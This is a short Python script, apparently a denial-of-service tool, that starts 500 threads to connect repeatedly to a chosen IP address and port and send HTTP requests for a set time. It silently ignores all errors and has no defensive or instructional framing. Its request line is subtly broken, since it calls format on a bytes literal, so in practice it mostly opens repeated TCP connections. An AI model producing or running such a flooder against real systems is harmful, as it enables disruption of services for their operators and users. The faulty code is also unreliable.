import threading
import socket
import time
import sys

def send_request(ip, port, stop_event):
    while not stop_event.is_set():
        try:
            # Create a socket
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Connect to the server
                s.connect((ip, int(port)))
                # Send a dummy request
                s.sendall(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip).encode('utf-8'))
                # Receive response
                s.recv(1024)
        except Exception as e:
            pass  # Ignore any exceptions

def main(ip, duration, port):
    stop_event = threading.Event()
    threads = []

    # Start 500 threads
    for _ in range(500):
        thread = threading.Thread(target=send_request, args=(ip, port, stop_event))
        thread.start()
        threads.append(thread)

    # Run for the specified duration
    time.sleep(duration)
    
    # Stop all threads
    stop_event.set()
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python ldap.py <ip> <time> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    duration = int(sys.argv[2])
    port = int(sys.argv[3])

    main(ip, duration, port)
